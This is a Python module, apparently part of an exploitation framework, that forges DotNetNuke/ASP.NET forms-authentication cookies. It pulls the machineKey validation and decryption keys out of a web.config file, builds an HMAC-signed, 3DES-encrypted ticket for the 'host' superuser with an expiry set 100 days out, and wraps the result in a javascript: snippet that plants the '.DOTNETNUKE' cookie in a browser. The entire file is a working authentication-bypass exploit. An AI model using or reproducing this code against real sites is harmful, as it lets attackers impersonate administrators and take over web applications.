import sys
if "." not in sys.path: sys.path.append(".")

import random
import struct
import time

from libs.Crypto.Hash import HMAC
from libs.Crypto.Hash import SHA
from libs.Crypto.Cipher import DES
from xml.etree import ElementTree
from internal import devlog


def forgeDotNetCookie(encryptionkey, validationkey, username, apppath):
    cookie = ""

    # Genero los primeros 8 bytes random
    for i in range(8):
        cookie += chr(random.randint(0,255))

    #Ticket version
    cookie += "\x02"

    # username
    cookie += username.encode("utf-16-le")

    # End delimiter
    cookie += "\x00\x00"

    # issue date, we use "now" minus 10hours, just in case
    cookie += struct.pack("<Q", (time.time()- 10*60*60 )*10**8)

    # Ticket persistent
    cookie += "\x00"

    # Expiration date, we use "now" plus 100 days :)
    cookie += struct.pack("<Q", (time.time() + 24*60*60*100)*10**8) 

    #User data, we are not using it now
    cookie += ""

    # End delimiter
    cookie += "\x00\x00"

    # App path
    cookie += apppath.encode("utf-16-le")

    # End cookie delimiter
    cookie += "\x00\x00"

    # HMAC it!
    cookie += HMAC.new(validationkey.decode("hex"), cookie, SHA).digest()

    #Pad it
    devlog('dotnetcookie', "len del cookie: %d" % len(cookie))
    if len(cookie)%8 == 0:
        cookie+= "\x08"*8
    else:
        devlog('dotnetcookie', '%s' % (chr(8-len(cookie)%8)*(8-len(cookie)%8)).encode("hex"))
        cookie+=chr(8-len(cookie)%8)*(8-len(cookie)%8) 

    devlog('dotnetcookie', "len del cookie: %d" % len(cookie))

    # Now we encrypt it :)
    obj = DES.triple_des(encryptionkey.decode("hex"), DES.CBC, '\0'*8)
    return obj.encrypt(cookie).encode("hex")

def getKeys(xmlData):
    import os
    
    try:
        root = ElementTree.fromstring(xmlData)
    except:
        # Try and parse the string between <configuration></configuration>
        start = xmlData.find('<configuration>')
        end   = xmlData.find('</configuration>')

        if start == -1 or end == -1:
            return None

        try:
            root = ElementTree.fromstring(xmlData[start:end+len('</configuration>')])
        except:
            return None

    machinekey = root.findall("system.web/machineKey")
    if machinekey:
        machinekey = machinekey[0]
    else:
        return None

    validationkey = machinekey.attrib["validationKey"]
    decryptionkey = machinekey.attrib["decryptionKey"]
    return (validationkey, decryptionkey)

def getAdminHash(validationkey, decryptionkey, username="host"):
    return forgeDotNetCookie(decryptionkey, validationkey, username, "/")

def getAdminCookie(validationkey, decryptionkey, username="host"):
    apppath = "/"
    cookie = forgeDotNetCookie(decryptionkey, validationkey, username, apppath)
    return "javascript:document.cookie='.DOTNETNUKE=%s;path=/';"  % cookie
